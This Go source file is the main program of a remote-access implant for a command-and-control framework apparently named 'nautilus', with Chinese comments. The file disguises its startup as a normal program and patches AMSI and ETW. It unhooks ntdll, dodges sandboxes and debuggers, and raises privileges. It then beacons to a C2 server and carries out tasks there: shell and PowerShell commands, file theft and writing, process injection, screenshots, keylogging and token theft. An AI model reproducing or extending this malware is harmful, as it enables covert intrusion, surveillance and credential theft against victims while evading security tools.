package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"time"

	"nautilus/c2/encode"
	"nautilus/c2/transport"
	"nautilus/core"
	"nautilus/evasion"
)

func init() {
	flag.StringVar(&c2Addr, "addr", "http://localhost:8443", "C2 server address")
	flag.StringVar(&intervalStr, "interval", "", "heartbeat interval in seconds")
	flag.StringVar(&jitterStr, "jitter", "", "jitter percentage")
	flag.StringVar(&skipSandbox, "skip-sandbox", "", "skip sandbox check")
}

var (
	c2Addr      string
	intervalStr string
	jitterStr   string
	sessionID   string
	skipSandbox string
)

// 正常程序初始化行为，打破恶意程序模式
func normalInit() {
	rand.Seed(time.Now().UnixNano())
	// 随机延迟 500-1500ms，模拟正常程序启动延迟
	delay := time.Duration(500+rand.Intn(1000)) * time.Millisecond
	time.Sleep(delay)

	// 创建假的临时配置文件（正常程序行为）
	tmpPath := os.TempDir()
	cfgName := fmt.Sprintf("%s\\app_%d.tmp", tmpPath, rand.Intn(10000))
	f, err := os.OpenFile(cfgName, os.O_WRONLY|os.O_CREATE|os.O_EXCL, 0644)
	if err == nil {
		f.WriteString(fmt.Sprintf("# App Config v%d.%d\n", rand.Intn(10), rand.Intn(100)))
		f.Close()
		os.Remove(cfgName) // 立即删除，模拟临时文件清理
	}
}

func main() {
	flag.Parse()
	normalInit()

	// ===== Halo's Gate: 初始化SSN映射表 (必须在所有syscall之前) =====
	evasion.InitSSNMap()
	evasion.InitIndirectSyscall()
	evasion.InitStackSpoof()

	// ===== 提权: SeDebugPrivilege =====
	core.TryElevate()

	// ===== EDR Evasion: AMSI + ETW Patch =====
	evasion.BypassAMSI()
	evasion.BypassETW()

	evasion.InitLegitimateAPIs()

	evasion.NtdllUnhook()

	if skipSandbox != "1" {
		if evasion.AntiSandbox() {
			os.Exit(0)
		}
	}

	if evasion.AntiDebug() {
		os.Exit(0)
	}

	var interval, jitter int
	if intervalStr != "" {
		fmt.Sscanf(intervalStr, "%d", &interval)
	}
	if jitterStr != "" {
		fmt.Sscanf(jitterStr, "%d", &jitter)
	}

	cfg := transport.DefaultConfig(c2Addr)
	if interval > 0 {
		cfg.Interval = interval
	}
	if jitter > 0 {
		cfg.Jitter = jitter
	}

	tp := transport.NewHTTPTransport(cfg)

	// 随机重试次数，打破固定模式
	maxRetries := 2 + rand.Intn(3)
	for i := 0; i < maxRetries; i++ {
		err := initSession(tp)
		if err == nil {
			fmt.Fprintf(os.Stderr, "[DBG] initSession OK, sessionID=%s\n", sessionID)
			break
		}
		fmt.Fprintf(os.Stderr, "[DBG] initSession attempt %d err: %v\n", i+1, err)
		time.Sleep(tp.GetInterval())
	}
	if sessionID == "" {
		return
	}

	// 主循环: 随机间隔轮询C2
	// P1: Ekko Sleep Encryption — 休眠期加密模块内存，绕过EDR内存扫描
	for {
		// 随机额外延迟，打破固定心跳模式
		extraDelay := time.Duration(rand.Intn(3000)) * time.Millisecond
		// TODO: 修复与Go运行时.data段冲突的问题
		time.Sleep(tp.GetInterval() + extraDelay)

		pkt, err := tp.Poll(sessionID)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[DBG] Poll err: %v\n", err)
			continue
		}

		if pkt.Type == encode.MsgTask {
			result := procReq(pkt)
			respPkt := &encode.Packet{
				Type:   encode.MsgTaskResult,
				TaskID: pkt.TaskID,
				Data:   result,
			}
			_, err := tp.Send(respPkt, sessionID)
			if err != nil {
				time.Sleep(tp.GetInterval())
				continue
			}
		}

		time.Sleep(tp.GetInterval())
	}
}

// initSession 上线注册
func initSession(tp *transport.HTTPTransport) error {
	info := core.GetSysInfo()
	infoJSON, _ := json.Marshal(info)
	pkt := &encode.Packet{
		Type: encode.MsgRegister,
		Data: infoJSON,
	}
	respPkt, err := tp.Send(pkt, "")
	if err != nil {
		fmt.Fprintf(os.Stderr, "[DBG] initSession Send err: %v\n", err)
		return err
	}

	// 从响应中提取sessionID
	fmt.Fprintf(os.Stderr, "[DBG] initSession resp type=%d data=%s\n", respPkt.Type, string(respPkt.Data))
	if respPkt.Type == encode.MsgRegister {
		var resp map[string]string
		json.Unmarshal(respPkt.Data, &resp)
		if sid, ok := resp["session_id"]; ok {
			sessionID = sid
			fmt.Fprintf(os.Stderr, "[DBG] initSession parsed sid=%s\n", sid)
		}
	}
	return nil
}

// procReq 处理下发的任务
func procReq(pkt *encode.Packet) []byte {
	req, err := encode.DecodeTaskReq(pkt.Data)
	if err != nil {
		resp := &encode.TaskResp{
			TaskID:  pkt.TaskID,
			Success: false,
			Error:   fmt.Sprintf("decode task failed: %v", err),
		}
		data, _ := encode.EncodeTaskResp(resp)
		return data
	}

	resp := &encode.TaskResp{
		TaskID: pkt.TaskID,
	}

	switch req.TaskType {
	case encode.TaskExecCmd:
		output, err := core.ExecCmdWithShell(req.Params["command"])
		resp.Output = output
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskExecPS:
		output, err := core.ExecCmdWithPowerShell(req.Params["command"])
		resp.Output = output
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskFileRead:
		data, err := core.FileRead(req.Params["path"])
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = evasion.B64Encode(data)
		}

	case encode.TaskFileWrite:
		data, err := evasion.B64Decode(req.Params["data"])
		if err != nil {
			resp.Success = false
			resp.Error = err.Error()
		} else {
			err = core.FileWrite(req.Params["path"], data)
			resp.Success = err == nil
			if err != nil {
				resp.Error = err.Error()
			}
		}

	case encode.TaskFileDelete:
		err := core.FileRemove(req.Params["path"])
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskListDir:
		files, err := core.ListDir(req.Params["path"])
		resp.Success = err == nil
		resp.Output = strings.Join(files, "\n")
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskProcList:
		procs, err := core.ProcessList()
		resp.Success = err == nil
		resp.Output = strings.Join(procs, "\n")
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskProcKill:
		pid := 0
		fmt.Sscanf(req.Params["pid"], "%d", &pid)
		err := core.ProcessKill(pid)
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskPrivInfo:
		info := core.GetPrivilegeInfo()
		resp.Success = true
		resp.Output = core.FormatPrivilegeInfo(info)

	case encode.TaskPayload:
		resp.Output = handlePayload(req.Params)

	case encode.TaskInject:
		output, err := core.HandleInject(req.Params)
		resp.Success = err == nil
		resp.Output = output
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskScreenshot:
		data, err := core.CaptureScreenshot()
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = base64.StdEncoding.EncodeToString(data)
		}

	case encode.TaskKeylogOn:
		err := core.StartKeylogger()
		resp.Success = err == nil
		if err != nil {
			resp.Error = err.Error()
		} else {
			resp.Output = "keylogger started"
		}

	case encode.TaskKeylogOff:
		output, err := core.StopKeylogger()
		resp.Success = err == nil
		resp.Output = output
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskTokenEnum, encode.TaskTokenSteal, encode.TaskTokenRev2, encode.TaskTokenMake:
		output, err := core.HandleToken(req.Params)
		resp.Success = err == nil
		resp.Output = output
		if err != nil {
			resp.Error = err.Error()
		}

	case encode.TaskSysInfo:
		info := core.GetSysInfo()
		resp.Success = true
		resp.Output = core.FormatSysInfo(info)

	case encode.TaskExit:
		os.Exit(0)

	default:
		resp.Success = false
		resp.Error = fmt.Sprintf("unknown task type: %d", req.TaskType)
	}

	data, _ := encode.EncodeTaskResp(resp)
	return data
}
